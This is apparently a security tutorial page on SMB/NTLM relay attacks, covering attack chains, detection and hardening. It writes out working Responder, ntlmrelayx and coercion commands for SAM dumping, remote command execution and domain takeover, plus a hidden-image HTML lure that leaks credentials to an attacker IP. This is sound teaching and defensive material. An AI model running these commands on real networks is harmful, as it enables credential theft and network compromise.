---
title: SMB Relay Attacks Explained
description: Understand how SMB Relay attacks exploit NTLM authentication in Windows networks — from capture to credential forwarding — and how to defend against them.
navigation:
  icon: i-lucide-shield-alert
---

## Introduction

An **SMB Relay Attack** is a type of **Man-in-the-Middle (MitM)** attack where an adversary intercepts NTLM authentication requests and **relays** (forwards) them to another machine on the network — gaining unauthorized access **without ever cracking the password**.

::caution
This content is for **educational and authorized security testing purposes only**. Performing these attacks on networks without explicit written authorization is **illegal** and violates computer fraud laws (CFAA, Computer Misuse Act, etc.).
::

::card-group
  ::card
  ---
  title: What You'll Learn
  icon: i-lucide-book-open
  ---
  - How NTLM authentication works
  - Why SMB signing prevents relay attacks
  - Full attack chain walkthrough
  - Tools used by red teamers & attackers
  - Detection and mitigation strategies
  ::

  ::card
  ---
  title: Key Context
  icon: i-lucide-info
  ---
  - **Attack Type:** Man-in-the-Middle / Credential Relay
  - **Protocol:** SMB (TCP 445), NTLM Authentication
  - **Impact:** Remote code execution, lateral movement
  - **MITRE ATT&CK:** [T1557.001](https://attack.mitre.org/techniques/T1557/001/)
  - **Difficulty:** Intermediate
  ::
::

---

## Understanding the Fundamentals

Before diving into the attack, you need to understand how **SMB** and **NTLM** work together.

### What is SMB?

**Server Message Block (SMB)** is a network protocol used in Windows environments for:

| Function | Example | Default Port |
|---|---|---|
| File Sharing | `\\server\share` | TCP 445 |
| Printer Access | `\\printserver\HP-LaserJet` | TCP 445 |
| Named Pipes | Inter-process communication | TCP 445 |
| Remote Administration | PsExec, WMI, SCCM | TCP 445 |

::note
SMB is the **backbone of Windows networking**. Every time a user maps a network drive, accesses a shared folder, or a Group Policy updates — SMB is involved.
::

### What is NTLM Authentication?

**NTLM (NT LAN Manager)** is a challenge-response authentication protocol used when **Kerberos is unavailable** — which happens more often than most administrators realize.

::steps{level="4"}

#### Client Requests Access

The client sends a `NEGOTIATE` message to the target server, indicating it wants to authenticate.

#### Server Sends Challenge

The server generates a random **16-byte nonce** (challenge) and sends it back in a `CHALLENGE` message.

#### Client Sends Response

The client encrypts the challenge using the **NTLM hash of the user's password** and sends the result as the `AUTHENTICATE` message (Net-NTLMv2 hash).

#### Server Validates

The server (or Domain Controller) verifies the response. If valid, access is granted.

::

```
┌──────────┐                              ┌──────────┐
│  Client  │                              │  Server  │
└────┬─────┘                              └────┬─────┘
     │                                         │
     │  1. NEGOTIATE_MESSAGE                   │
     │  "I want to authenticate"               │
     │────────────────────────────────────────▶│
     │                                         │
     │  2. CHALLENGE_MESSAGE                   │
     │  "Here's a random challenge: 0xABCD..." │
     │◀────────────────────────────────────────│
     │                                         │
     │  3. AUTHENTICATE_MESSAGE                │
     │  "Challenge encrypted with my           │
     │   password hash: 0x7F3E..."             │
     │────────────────────────────────────────▶│
     │                                         │
     │  4. Access Granted / Denied             │
     │◀────────────────────────────────────────│
     │                                         │
```

::warning
NTLM **does not authenticate the server to the client**. The client blindly sends its credential response to whoever presented the challenge. This is the **fundamental flaw** that makes relay attacks possible.
::

### When Does NTLM Get Used Instead of Kerberos?

Kerberos is the default in Active Directory, but NTLM **falls back** in these common scenarios:

::card-group
  ::card
  ---
  title: IP Address Access
  icon: i-lucide-globe
  ---
  Accessing a server by **IP address** instead of hostname:
  
  ```
  \\192.168.1.50\share    ← NTLM
  \\fileserver\share      ← Kerberos
  ```
  ::

  ::card
  ---
  title: Non-Domain Systems
  icon: i-lucide-monitor-off
  ---
  When the client or server is **not joined to the domain**, or communicating across **forest/domain boundaries** without proper trusts.
  ::

  ::card
  ---
  title: Legacy Applications
  icon: i-lucide-archive
  ---
  Older applications that don't support Kerberos — web apps using **NTLM SSO**, legacy intranet portals, and custom enterprise software.
  ::

  ::card
  ---
  title: Name Resolution Failures
  icon: i-lucide-search-x
  ---
  When **DNS fails** and the client falls back to **LLMNR/NBT-NS/mDNS** for name resolution — a critical poisoning opportunity.
  ::
::

---

## How the SMB Relay Attack Works

The relay attack exploits NTLM's lack of mutual authentication by inserting an attacker **between the client and target**.

### Attack Flow Diagram

![SMB Relay Attack Flow](https://www.thehacker.recipes/assets/ntlm-relay.png)

### Step-by-Step Attack Chain

::steps{level="3"}

### Poisoning — Capture the Authentication Request

The attacker first needs a victim to **send NTLM credentials to them**. This is typically achieved by poisoning name resolution protocols.

When a Windows machine tries to resolve a hostname that **DNS can't resolve**, it falls back to broadcast protocols:

| Protocol | Full Name | Scope | Port |
|---|---|---|---|
| **LLMNR** | Link-Local Multicast Name Resolution | Local subnet | UDP 5355 |
| **NBT-NS** | NetBIOS Name Service | Local subnet | UDP 137 |
| **mDNS** | Multicast DNS | Local subnet | UDP 5353 |

The attacker **responds to these broadcasts**, pretending to be the requested hostname:

```
┌──────────┐                    ┌──────────┐                    ┌──────────┐
│  Victim  │                    │ Attacker │                    │  Target  │
│  Client  │                    │  (MitM)  │                    │  Server  │
└────┬─────┘                    └────┬─────┘                    └────┬─────┘
     │                               │                               │
     │  1. DNS Query: "filesrvr"     │                               │
     │──────▶ DNS Server ──▶ NXDOMAIN (not found)                    │
     │                               │                               │
     │  2. LLMNR Broadcast:          │                               │
     │  "Who is filesrvr?"           │                               │
     │──────────────────────────────▶│                               │
     │                               │                               │
     │  3. Poisoned Response:        │                               │
     │  "filesrvr is ME (10.0.0.50)" │                               │
     │◀──────────────────────────────│                               │
     │                               │                               │
```

::tip
Common triggers for LLMNR/NBT-NS queries include **typos in UNC paths**, **stale mapped drives**, **GPO references to renamed servers**, and **WPAD (Web Proxy Auto-Discovery)** requests.
::

### Challenge — The Attacker Becomes a Proxy

Once the victim connects to the attacker, the attacker **simultaneously opens a connection to the real target** and proxies the NTLM handshake:

```
┌──────────┐                    ┌──────────┐                    ┌──────────┐
│  Victim  │                    │ Attacker │                    │  Target  │
│  Client  │                    │  (Relay) │                    │  Server  │
└────┬─────┘                    └────┬─────┘                    └────┬─────┘
     │                               │                               │
     │  4. NEGOTIATE to Attacker     │                               │
     │──────────────────────────────▶│                               │
     │                               │  5. NEGOTIATE to Target       │
     │                               │──────────────────────────────▶│
     │                               │                               │
     │                               │  6. CHALLENGE from Target     │
     │                               │◀──────────────────────────────│
     │  7. CHALLENGE forwarded       │                               │
     │◀──────────────────────────────│                               │
     │                               │                               │
```

::note
The attacker forwards the **real target's challenge** to the victim. The victim doesn't know it's authenticating to a different server than intended.
::

### Authenticate — Relaying the Credentials

The victim encrypts the challenge with their password hash and sends it back. The attacker **forwards this valid response** to the target:

```
┌──────────┐                    ┌──────────┐                    ┌──────────┐
│  Victim  │                    │ Attacker │                    │  Target  │
│  Client  │                    │  (Relay) │                    │  Server  │
└────┬─────┘                    └────┬─────┘                    └────┬─────┘
     │                               │                               │
     │  8. AUTHENTICATE response     │                               │
     │  (encrypted with victim's     │                               │
     │   password hash)              │                               │
     │──────────────────────────────▶│                               │
     │                               │  9. AUTHENTICATE forwarded    │
     │                               │──────────────────────────────▶│
     │                               │                               │
     │                               │  10. ACCESS GRANTED ✅        │
     │                               │◀──────────────────────────────│
     │                               │                               │
     │                               │  11. Execute payload          │
     │                               │  (dump SAM, run commands,     │
     │                               │   deploy backdoor)            │
     │                               │──────────────────────────────▶│
     │                               │                               │
```

### Post-Exploitation — Using the Access

With authenticated access to the target, the attacker can:

- **Dump local credentials** from the SAM database
- **Execute commands** via services (SCM) or WMI
- **Deploy backdoors** or reverse shells
- **Pivot deeper** into the network
- **Access sensitive files** on shared drives

::caution
If the relayed user has **local administrator privileges** on the target, the attacker gains **full system control** — equivalent to physical access.
::

::

---

## Attack Tools & Techniques

::tabs
  :::tabs-item{icon="i-lucide-radio-tower" label="1. Poisoning (Responder)"}

  [**Responder**](https://github.com/lgandx/Responder) is the primary tool for poisoning LLMNR, NBT-NS, and mDNS requests.

  ```bash [Terminal — Start Responder (capture only)]
  # -I: Network interface
  # -dwPv: Disable WPAD rogue proxy, be verbose
  # Turn OFF SMB and HTTP servers (let ntlmrelayx handle them)

  sudo responder -I eth0 -dwPv
  ```

  Modify Responder's config to disable its built-in servers when relaying:

  ```ini [/opt/Responder/Responder.conf]
  [Responder Core]
  ; Set these to Off when using ntlmrelayx
  SMB      = Off
  HTTP     = Off

  ; Keep these On for poisoning
  LLMNR    = On
  NBT-NS  = On
  mDNS    = On
  DNS     = On
  ```

  ::warning
  If Responder's SMB/HTTP servers are **On**, it will capture hashes for cracking instead of relaying. You must turn them **Off** when performing relay attacks.
  ::

  :::

  :::tabs-item{icon="i-lucide-route" label="2. Relaying (ntlmrelayx)"}

  [**ntlmrelayx**](https://github.com/fortra/impacket) from Impacket is the industry-standard relay tool.

  First, identify targets **without SMB signing required**:

  ```bash [Terminal — Enumerate SMB Signing]
  # Using CrackMapExec / NetExec
  nxc smb 10.0.0.0/24 --gen-relay-list targets.txt

  # Or using Nmap
  nmap --script smb2-security-mode -p 445 10.0.0.0/24
  ```

  ```bash [Terminal — targets.txt output]
  # Hosts WITHOUT SMB signing required (vulnerable to relay)
  10.0.0.101
  10.0.0.105
  10.0.0.110
  10.0.0.115
  ```

  Then start the relay:

  ```bash [Terminal — Start ntlmrelayx]
  # Basic relay — dump SAM hashes on successful auth
  sudo ntlmrelayx.py -tf targets.txt -smb2support

  # Execute a command on the target
  sudo ntlmrelayx.py -tf targets.txt -smb2support \
    -c "whoami > C:\relay-proof.txt"

  # Get an interactive SMB shell
  sudo ntlmrelayx.py -tf targets.txt -smb2support -i

  # Relay to LDAP (for domain-level attacks)
  sudo ntlmrelayx.py -t ldap://10.0.0.1 --delegate-access

  # Relay to MSSQL
  sudo ntlmrelayx.py -t mssql://10.0.0.200 -q "SELECT @@version"

  # Dump domain info via LDAP
  sudo ntlmrelayx.py -t ldap://DC01.corp.local --dump-laps --dump-gmsa
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="3. Coercion (PetitPotam/PrinterBug)"}

  Instead of waiting for victims to stumble into poisoned responses, you can **force authentication** from specific machines:

  ```bash [Terminal — PetitPotam (MS-EFSRPC)]
  # Force a target to authenticate to your listener
  # No credentials required on unpatched systems!

  python3 PetitPotam.py \
    <LISTENER_IP> \      # Your attacker IP (where ntlmrelayx listens)
    <TARGET_IP>          # Machine you want to coerce

  # Example: Force DC to auth to attacker
  python3 PetitPotam.py 10.0.0.50 10.0.0.1
  ```

  ```bash [Terminal — PrinterBug / SpoolSample (MS-RPRN)]
  # Requires valid domain credentials
  python3 printerbug.py \
    'CORP/user:Password123'@<TARGET_IP> \
    <LISTENER_IP>

  # Using dementor.py
  python3 dementor.py -u user -p 'Password123' -d corp.local \
    <LISTENER_IP> <TARGET_IP>
  ```

  ```bash [Terminal — DFSCoerce (MS-DFSNM)]
  # Another coercion method via DFS
  python3 dfscoerce.py -u user -p 'Password123' -d corp.local \
    <LISTENER_IP> <TARGET_IP>
  ```

  | Coercion Method | Protocol | Auth Required | Patched |
  |---|---|---|---|
  | **PetitPotam** | MS-EFSRPC | No (unpatched) | Partially (KB5005413) |
  | **PrinterBug** | MS-RPRN (Print Spooler) | Yes (domain user) | No (by design) |
  | **DFSCoerce** | MS-DFSNM | Yes (domain user) | Yes (2022 patches) |
  | **ShadowCoerce** | MS-FSRVP | Yes (domain user) | Yes |

  ::caution
  Coercion attacks targeting **Domain Controllers** are especially dangerous. An attacker can relay DC machine account credentials to **LDAPS** and configure **Resource-Based Constrained Delegation (RBCD)** to fully compromise the domain.
  ::
  :::

  :::tabs-item{icon="i-lucide-layers" label="4. Complete Attack Chain"}

  Running the full attack with two terminal windows:

  ```bash [Terminal 1 — Responder (Poisoning)]
  # Poison LLMNR/NBT-NS, but let ntlmrelayx handle SMB/HTTP
  sudo responder -I eth0 -dwPv
  ```

  ```bash [Terminal 2 — ntlmrelayx (Relaying)]
  # Relay captured auth to targets without SMB signing
  sudo ntlmrelayx.py \
    -tf targets.txt \
    -smb2support \
    --output-file relay-results.txt \
    -of hashes.txt
  ```

  ```bash [Terminal 3 (Optional) — Force Authentication]
  # Coerce a high-value target to authenticate
  python3 PetitPotam.py 10.0.0.50 10.0.0.1
  ```

  ```bash [Successful Relay Output]
  [*] SMBD: Received connection from 10.0.0.101
  [*] HTTPD: Received connection from 10.0.0.101
  [*] Authenticating against smb://10.0.0.105 as CORP\jsmith
  [*] Target smb://10.0.0.105 is ADMIN$ accessible — JACKPOT!
  [*] Service RemoteRegistry is in stopped state
  [*] Starting service RemoteRegistry
  [*] Dumping SAM hashes:
  Administrator:500:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
  [*] Done dumping SAM hashes
  ```
  :::
::

---

## Relay Attack Variants

Not all relay attacks target SMB. NTLM authentication is used across many protocols:

::accordion
  :::accordion-item{icon="i-lucide-globe" label="HTTP → SMB Relay"}
  Capture NTLM auth via a **malicious webpage or document** and relay to SMB:

  ```bash [Terminal]
  # ntlmrelayx listens on HTTP and relays to SMB
  sudo ntlmrelayx.py -tf targets.txt -smb2support
  ```

  Trigger via:
  - Malicious HTML email with `<img src="\\attacker\image">`
  - Office documents with UNC path references
  - Compromised intranet pages
  - WPAD abuse (auto-proxy configuration)

  ```html [Malicious HTML — triggers NTLM auth]
  <!-- Victim's browser/email client will send NTLM credentials -->
  <img src="\\10.0.0.50\share\logo.png" width="1" height="1">

  <!-- Or via a link -->
  <a href="file://10.0.0.50/share">Click here</a>
  ```
  :::

  :::accordion-item{icon="i-lucide-database" label="SMB → LDAP(S) Relay (Domain Takeover)"}
  Relay machine account credentials to **LDAP** for domain-level attacks:

  ```bash [Terminal]
  # Configure RBCD — allows the attacker to impersonate any user
  sudo ntlmrelayx.py \
    -t ldaps://DC01.corp.local \
    --delegate-access \
    --escalate-user attacker-machine$

  # Then use the delegation to get a service ticket
  getST.py -spn cifs/TARGET.corp.local \
    -impersonate Administrator \
    'corp.local/attacker-machine$:password'

  # Use the ticket
  export KRB5CCNAME=Administrator.ccache
  psexec.py -k -no-pass TARGET.corp.local
  ```

  ::caution
  This variant can lead to **full domain compromise** in a single attack chain. It's one of the most critical Active Directory attack paths.
  ::
  :::

  :::accordion-item{icon="i-lucide-mail" label="SMB → Exchange (PrivExchange)"}
  Relay to Microsoft Exchange's HTTP endpoint to escalate privileges:

  ```bash [Terminal]
  # Relay to Exchange Web Services
  sudo ntlmrelayx.py \
    -t https://exchange.corp.local/EWS/Exchange.asmx \
    --escalate-user attacker-user

  # Coerce Exchange to authenticate
  python3 httpattack.py exchange.corp.local
  ```

  This grants the attacker **DCSync rights** — the ability to replicate all password hashes from the Domain Controller.
  :::

  :::accordion-item{icon="i-lucide-shield-off" label="SMB → ADCS (ESC8 — Certificate Relay)"}
  Relay to **Active Directory Certificate Services** web enrollment to obtain certificates:

  ```bash [Terminal]
  # Relay to ADCS HTTP enrollment endpoint
  sudo ntlmrelayx.py \
    -t http://CA01.corp.local/certsrv/certfnsh.asp \
    --adcs \
    --template DomainController

  # Coerce DC to authenticate
  python3 PetitPotam.py 10.0.0.50 DC01.corp.local

  # Use the obtained certificate to authenticate as the DC
  python3 gettgtpkinit.py -cert-pfx dc01.pfx \
    -pfx-pass '' corp.local/DC01$ dc01.ccache
  ```

  ::warning
  **ESC8** is one of the most devastating ADCS attack paths. A single unauthenticated attacker can compromise the entire forest by relaying a DC's credentials to an ADCS web enrollment page.
  ::
  :::

  :::accordion-item{icon="i-lucide-database" label="SMB → MSSQL Relay"}
  Relay credentials to SQL servers for data access or command execution:

  ```bash [Terminal]
  # Relay to MSSQL — execute a query
  sudo ntlmrelayx.py \
    -t mssql://10.0.0.200 \
    -q "SELECT name FROM master.dbo.sysdatabases"

  # Enable xp_cmdshell and execute OS commands
  sudo ntlmrelayx.py \
    -t mssql://10.0.0.200 \
    -q "EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell 'whoami'"
  ```
  :::
::

---

## Why It Works — The Missing Security Controls

::card-group
  ::card
  ---
  title: No Mutual Authentication
  icon: i-lucide-user-x
  ---
  NTLM authenticates the **client to the server** but never the **server to the client**. The client can't verify who issued the challenge, so attackers can proxy it freely.
  ::

  ::card
  ---
  title: No Channel Binding
  icon: i-lucide-unlink
  ---
  NTLM responses are **not tied to the specific connection**. A valid response can be forwarded to any service that accepts NTLM — different host, different protocol.
  ::

  ::card
  ---
  title: SMB Signing Disabled
  icon: i-lucide-file-warning
  ---
  Without **SMB signing**, the server cannot verify that messages come from the authenticated client. By default, only **Domain Controllers** require SMB signing.
  ::

  ::card
  ---
  title: Broadcast Name Resolution
  icon: i-lucide-radio
  ---
  LLMNR and NBT-NS broadcast to the entire subnet, allowing **any machine** to respond. This gives attackers an easy entry point for capturing credentials.
  ::
::

---

## Detection

::tabs
  :::tabs-item{icon="i-lucide-search" label="Network Detection"}

  | Indicator | What to Look For | Tool |
  |---|---|---|
  | LLMNR/NBT-NS Responses | Unexpected hosts responding to name queries | Wireshark, Zeek |
  | Rapid SMB Connections | Same source authenticating to multiple targets in seconds | Network IDS |
  | Cross-Protocol Relay | NTLM auth arriving via HTTP being used for SMB | Packet inspection |
  | Abnormal SMB Traffic | SMB connections from non-standard ports or unexpected hosts | Firewall logs |

  ```bash [Wireshark Filter — Detect LLMNR Poisoning]
  # Show LLMNR responses from non-DNS servers
  llmnr && ip.src != <LEGITIMATE_DNS_SERVER>

  # Show NBT-NS responses
  nbns && nbns.flags.response == 1

  # Show SMB sessions with NTLM authentication
  ntlmssp.messagetype == 0x00000003
  ```
  :::

  :::tabs-item{icon="i-lucide-scroll-text" label="Windows Event Logs"}

  Key events to monitor on Domain Controllers and member servers:

  ::field-group
    ::field{name="Event ID 4624" type="Logon Success"}
    Look for `Logon Type 3` (Network) with **NtLmSsp** as the authentication package from unexpected source IPs.
    ::

    ::field{name="Event ID 4625" type="Logon Failure"}
    Repeated NTLM logon failures from the same IP targeting multiple accounts — indicates active relay attempts.
    ::

    ::field{name="Event ID 4776" type="NTLM Credential Validation"}
    Logged on Domain Controllers. Cross-reference the **source workstation** field — it should match the actual client, not an attacker's machine.
    ::

    ::field{name="Event ID 8004" type="NTLM Audit"}
    When NTLM auditing is enabled, logs all NTLM authentication attempts — essential for identifying where NTLM is still used.
    ::

    ::field{name="Event ID 4697 / 7045" type="Service Installation"}
    ntlmrelayx creates services for command execution. Alert on **unexpected service installations** on critical servers.
    ::
  ::

  ```xml [Sample SIEM Detection Rule (Sigma Format)]
  title: Potential NTLM Relay - Suspicious Network Logon
  status: experimental
  logsource:
    product: windows
    service: security
  detection:
    selection:
      EventID: 4624
      LogonType: 3
      AuthenticationPackageName: 'NTLM'
    filter:
      IpAddress|startswith:
        - '10.0.0.'     # Expected subnet
    condition: selection and not filter
  level: medium
  ```
  :::

  :::tabs-item{icon="i-lucide-radar" label="Honeypot Detection"}

  Deploy decoy services to detect relay activity:

  ```bash [Deploy a Honey SMB Share]
  # Create a fake SMB share that should never receive connections
  # Any authentication attempt = malicious activity

  # Using Responder's Analyze mode (detection only)
  sudo responder -I eth0 -A

  # Using a purpose-built honeypot
  # https://github.com/0x4D31/honeybits
  ```

  ::tip
  Place honeypot SMB servers on unused IPs in your subnet. Any NTLM authentication attempt against them is a strong indicator of poisoning or relay activity.
  ::
  :::
::

---

## Mitigation & Defense

::steps{level="3"}

### Enforce SMB Signing (Critical)

**SMB signing** is the single most effective defense. It cryptographically signs every SMB packet, preventing relayed authentication from being used.

::tabs
  :::tabs-item{icon="i-lucide-settings" label="Group Policy"}

  ```
  Computer Configuration
  └── Policies
      └── Windows Settings
          └── Security Settings
              └── Local Policies
                  └── Security Options
                      ├── Microsoft network server: Digitally sign communications (always) → Enabled
                      └── Microsoft network client: Digitally sign communications (always) → Enabled
  ```

  | Setting | Registry Path | Value |
  |---|---|---|
  | Server — Require Signing | `HKLM\System\CurrentControlSet\Services\LanManServer\Parameters\RequireSecuritySignature` | `1` |
  | Client — Require Signing | `HKLM\System\CurrentControlSet\Services\LanManWorkstation\Parameters\RequireSecuritySignature` | `1` |

  :::

  :::tabs-item{icon="i-lucide-terminal" label="PowerShell"}
  ```powershell [Verify SMB Signing Status]
  # Check server signing configuration
  Get-SmbServerConfiguration | Select-Object EnableSecuritySignature, RequireSecuritySignature

  # Check all machines in the domain
  Get-ADComputer -Filter * | ForEach-Object {
      $result = Invoke-Command -ComputerName $_.Name -ScriptBlock {
          Get-SmbServerConfiguration | Select-Object RequireSecuritySignature
      } -ErrorAction SilentlyContinue
      [PSCustomObject]@{
          Computer = $_.Name
          SigningRequired = $result.RequireSecuritySignature
      }
  } | Format-Table -AutoSize
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Linux Audit"}
  ```bash [Scan Network for SMB Signing]
  # Using NetExec (formerly CrackMapExec)
  nxc smb 10.0.0.0/24 --gen-relay-list unsigned-hosts.txt

  # Using Nmap
  nmap -p 445 --script smb2-security-mode 10.0.0.0/24 \
    -oG - | grep "not required"

  # Check how many hosts are vulnerable
  wc -l unsigned-hosts.txt
  ```
  :::
::

::warning
Enabling SMB signing on all machines may cause a **3–5% performance overhead** on file servers with heavy I/O. Test in your environment before domain-wide deployment. **The security benefit far outweighs the cost.**
::

### Disable LLMNR and NBT-NS

Remove the broadcast protocols that enable poisoning:

::tabs
  :::tabs-item{icon="i-lucide-settings" label="Group Policy — LLMNR"}
  ```
  Computer Configuration
  └── Administrative Templates
      └── Network
          └── DNS Client
              └── Turn off multicast name resolution → Enabled
  ```
  :::

  :::tabs-item{icon="i-lucide-settings" label="Group Policy — NBT-NS"}
  Disable via DHCP or network adapter settings:

  ```
  Computer Configuration
  └── Administrative Templates
      └── Network
          └── Network Connections
              └── Prohibit use of Internet Connection Sharing
                  on your DNS domain network → Enabled
  ```

  Or via PowerShell on each adapter:

  ```powershell [Disable NBT-NS]
  # Disable NetBIOS over TCP/IP on all adapters
  Get-WmiObject Win32_NetworkAdapterConfiguration |
    Where-Object { $_.IPEnabled -eq $true } |
    ForEach-Object { $_.SetTcpipNetbios(2) }
  # 0 = Default, 1 = Enabled, 2 = Disabled
  ```
  :::

  :::tabs-item{icon="i-lucide-settings" label="DHCP Option"}
  ```
  DHCP Server
  └── Scope Options
      └── Option 001 (Microsoft Disable Netbios Option)
          └── Value: 0x2
  ```
  :::
::

### Enable EPA and Channel Binding

**Extended Protection for Authentication (EPA)** binds NTLM tokens to the TLS channel, preventing cross-protocol relay:

```powershell [Enable EPA on IIS / ADCS / Exchange]
# Enable EPA on IIS (ADCS Web Enrollment)
Set-WebConfigurationProperty -Filter /system.webServer/security/authentication/windowsAuthentication `
  -Name extendedProtection.tokenChecking -Value "Require" -PSPath "IIS:\"

# Verify EPA status
Get-WebConfigurationProperty -Filter /system.webServer/security/authentication/windowsAuthentication `
  -Name extendedProtection.tokenChecking -PSPath "IIS:\"
```

### Enforce LDAP Signing and Channel Binding

Prevent relay attacks targeting Domain Controller LDAP services:

```powershell [Domain Controller — LDAP Security]
# Require LDAP signing
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Services\NTDS\Parameters" `
  -Name "LDAPServerIntegrity" -Value 2

# Require LDAP channel binding
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Services\NTDS\Parameters" `
  -Name "LdapEnforceChannelBinding" -Value 2

# Values: 0 = Never, 1 = When supported, 2 = Always
```

| Setting | Value | Effect |
|---|---|---|
| LDAP Signing = `0` | Never | ❌ Vulnerable to relay |
| LDAP Signing = `1` | When Supported | ⚠️ Partial protection |
| LDAP Signing = `2` | Always Required | ✅ Relay blocked |
| Channel Binding = `2` | Always Required | ✅ Cross-protocol relay blocked |

### Restrict NTLM Authentication

Gradually reduce and eliminate NTLM usage across your domain:

```powershell [Audit and Restrict NTLM]
# Step 1: Audit NTLM usage (identify what still uses it)
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa\MSV1_0" `
  -Name "AuditReceivingNTLMTraffic" -Value 2

# Step 2: Review Event ID 8004 logs to find NTLM-dependent apps

# Step 3: Add exceptions for apps that need NTLM
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa\MSV1_0" `
  -Name "ClientAllowedNTLMServers" -Value @("legacyapp.corp.local")

# Step 4: Deny all NTLM (after exceptions are configured)
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa\MSV1_0" `
  -Name "RestrictReceivingNTLMTraffic" -Value 2
```

::caution
**Do not block NTLM domain-wide without thorough auditing first.** Many legacy applications, printers, and Linux/macOS clients may rely on NTLM. Use audit mode for at least **30 days** before enforcing.
::

### Protect Privileged Accounts

Limit the impact of a successful relay:

::card-group
  ::card
  ---
  title: Protected Users Group
  icon: i-lucide-shield-check
  ---
  Add sensitive accounts to the **Protected Users** security group:

  ```powershell
  Add-ADGroupMember -Identity "Protected Users" `
    -Members "admin-jsmith", "svc-backup"
  ```

  Members **cannot authenticate via NTLM** — only Kerberos. Eliminates relay risk entirely for those accounts.
  ::

  ::card
  ---
  title: Tiered Administration
  icon: i-lucide-layers
  ---
  Implement a **tiered admin model**:

  - **Tier 0:** Domain Admins — only log into DCs
  - **Tier 1:** Server Admins — only log into servers
  - **Tier 2:** Workstation Admins — only log into workstations

  A relayed Tier 2 credential **cannot access** Tier 0/1 systems.
  ::

  ::card
  ---
  title: Disable Local Admin on Workstations
  icon: i-lucide-user-minus
  ---
  Use **LAPS (Local Administrator Password Solution)** to randomize local admin passwords:

  ```powershell
  # Deploy Microsoft LAPS
  Install-Module -Name LAPS
  Update-LapsADSchema
  Set-LapsADComputerSelfPermission -Identity "OU=Workstations,DC=corp,DC=local"
  ```

  Even if relayed, the attacker gets access with a **unique, rotated password** — no lateral movement.
  ::

  ::card
  ---
  title: Disable Print Spooler
  icon: i-lucide-printer
  ---
  Disable the Print Spooler on servers where it's not needed — especially **Domain Controllers**:

  ```powershell
  Stop-Service -Name Spooler
  Set-Service -Name Spooler -StartupType Disabled
  ```

  This blocks the **PrinterBug/SpoolSample** coercion technique.
  ::


---

## Defense Summary Checklist

| # | Control | Priority | Blocks |
|---|---|---|---|
| 1 | **Enable SMB Signing** on all systems | 🔴 Critical | SMB relay |
| 2 | **Disable LLMNR & NBT-NS** | 🔴 Critical | Credential capture/poisoning |
| 3 | **Enable LDAP Signing & Channel Binding** | 🔴 Critical | LDAP relay |
| 4 | **Enable EPA** on ADCS, Exchange, IIS | 🟠 High | HTTP → LDAP/SMB relay |
| 5 | **Disable Print Spooler** on DCs & servers | 🟠 High | PrinterBug coercion |
| 6 | **Patch for PetitPotam** (KB5005413+) | 🟠 High | EFS coercion |
| 7 | **Use Protected Users group** for admins | 🟠 High | NTLM for privileged accounts |
| 8 | **Audit & restrict NTLM** usage | 🟡 Medium | All NTLM-based attacks |
| 9 | **Deploy LAPS** for local admin passwords | 🟡 Medium | Lateral movement after relay |
| 10 | **Implement tiered administration** | 🟡 Medium | Privilege escalation scope |
| 11 | **Monitor for Event IDs** 4624/4625/8004 | 🟡 Medium | Detection |
| 12 | **Deploy network honeypots** | 🟢 Low | Early warning |

::tip
Start with items **1–3** — they block the vast majority of relay attacks with minimal operational impact.
::

---

## Lab Environment Setup

Practice these attacks safely in an isolated lab:

::accordion
  :::accordion-item{icon="i-lucide-box" label="Quick Lab with Docker"}

  ```yaml [compose.yml — AD Lab (for testing only)]
  services:
    kali:
      image: kalilinux/kali-rolling
      container_name: attacker
      command: sleep infinity
      networks:
        - labnet
      cap_add:
        - NET_ADMIN

    vulnerable-smb:
      image: dperson/samba
      container_name: target-smb
      environment:
        - USER=testuser;password123
        - SHARE=public;/share;yes;no;yes
      ports:
        - "445:445"
      networks:
        - labnet

  networks:
    labnet:
      driver: bridge
      ipam:
        config:
          - subnet: 172.20.0.0/24
  ```
  :::

  :::accordion-item{icon="i-lucide-monitor" label="Full AD Lab with VMs"}

  Recommended setup for comprehensive testing:

  | VM | OS | Role | IP |
  |---|---|---|---|
  | DC01 | Windows Server 2022 | Domain Controller | 10.10.10.1 |
  | SRV01 | Windows Server 2022 | Member Server (signing off) | 10.10.10.10 |
  | WS01 | Windows 10/11 | Workstation (victim) | 10.10.10.100 |
  | KALI | Kali Linux 2024 | Attacker | 10.10.10.50 |

  ```powershell [DC01 — Quick AD Setup]
  # Install AD DS
  Install-WindowsFeature AD-Domain-Services -IncludeManagementTools

  # Promote to Domain Controller
  Install-ADDSForest -DomainName "lab.local" `
    -SafeModeAdministratorPassword (ConvertTo-SecureString "P@ssw0rd!" -AsPlainText -Force)

  # Create test user with local admin on SRV01
  New-ADUser -Name "relay.victim" -AccountPassword (ConvertTo-SecureString "Welcome1!" -AsPlainText -Force) -Enabled $true
  Add-ADGroupMember -Identity "Domain Admins" -Members "relay.victim"
  ```

  ```powershell [SRV01 — Disable SMB Signing (for testing)]
  # Make this server vulnerable to relay (LAB ONLY!)
  Set-SmbServerConfiguration -RequireSecuritySignature $false -Force
  Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Services\LanManServer\Parameters" `
    -Name "RequireSecuritySignature" -Value 0
  Restart-Service LanManServer
  ```
  :::

  :::accordion-item{icon="i-lucide-wrench" label="Install Attack Tools"}

  ```bash [Kali Linux — Tool Installation]
  # Update system
  sudo apt update && sudo apt upgrade -y

  # Install Impacket (includes ntlmrelayx)
  pip3 install impacket

  # Install Responder
  git clone https://github.com/lgandx/Responder.git /opt/Responder

  # Install NetExec (CrackMapExec successor)
  pip3 install netexec

  # Install PetitPotam
  git clone https://github.com/topotam/PetitPotam.git /opt/PetitPotam

  # Install PrinterBug
  git clone https://github.com/dirkjanm/krbrelayx.git /opt/krbrelayx

  # Verify installations
  ntlmrelayx.py --help
  responder --help
  nxc --help
  ```
  :::
::

---

## MITRE ATT&CK Mapping

